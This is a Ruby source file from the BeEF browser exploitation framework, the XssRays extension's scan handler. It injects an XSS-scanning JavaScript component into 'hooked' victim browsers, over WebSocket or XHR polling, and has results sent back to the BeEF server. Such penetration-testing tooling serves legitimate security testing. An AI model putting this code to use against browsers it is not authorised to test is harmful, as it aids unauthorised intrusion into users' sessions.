#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module Xssrays
      module API

        class Scan

          include BeEF::Core::Handlers::Modules::BeEFJS

          #
          # Add the xssrays main JS file to the victim DOM if there is a not-yet-started scan entry in the db.
          #
          def start_scan(hb, body)
            @body = body
            config = BeEF::Core::Configuration.instance
            hb = BeEF::Core::Models::HookedBrowser.first(:id => hb.id)
            #TODO: we should get the xssrays_scan table with more accuracy, if for some reasons we requested
            #TODO: 2 scans on the same hooked browsers, "first" could not get the right result we want
            xs = BeEF::Core::Models::Xssraysscan.first(:hooked_browser_id => hb.id, :is_started => false)

            # stop here if there are no XssRays scans to be started
            return if xs == nil || xs.is_started == true

            # set the scan as started
            xs.update(:is_started => true)

            # build the beefjs xssrays component

            # the URI of the XssRays handler where rays should come back if the vulnerability is verified
            beefurl = BeEF::Core::Server.instance.url
            cross_domain = xs.cross_domain
            timeout = xs.clean_timeout
            debug = config.get("beef.extension.xssrays.js_console_logs")

            ws = BeEF::Core::Websocket::Websocket.instance

            # todo antisnatchor: prevent sending "content" multiple times. Better leaving it after the first run, and don't send it again.
            # todo antisnatchor: remove this gsub crap adding some hook packing.
            if config.get("beef.http.websocket.enable") && ws.getsocket(hb.session)
              content = File.read(find_beefjs_component_path 'beef.net.xssrays').gsub('//
              //   Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
              //   Browser Exploitation Framework (BeEF) - http://beefproject.com
              //   See the file \'doc/COPYING\' for copying permission
              //', "")
              add_to_body xs.id, hb.session, beefurl, cross_domain, timeout, debug
              ws.send(content + @body,hb.session)
              #if we use WebSockets, just reply wih the component contents
            else # if we use XHR-polling, add the component to the main hook file
              build_missing_beefjs_components 'beef.net.xssrays'
              add_to_body xs.id, hb.session, beefurl, cross_domain, timeout, debug
            end

            print_debug("[XSSRAYS] Adding XssRays to the DOM. Scan id [#{xs.id}], started at [#{xs.scan_start}], cross domain [#{cross_domain}], clean timeout [#{timeout}], js console debug [#{debug}].")

          end

          def add_to_body(id, session, beefurl, cross_domain, timeout, debug)
            @body << %Q{
              beef.execute(function() {
                beef.net.xssrays.startScan('#{id}', '#{session}', '#{beefurl}', #{cross_domain}, #{timeout}, #{debug});
              });
            }
          end
        end
      end
    end
  end
end
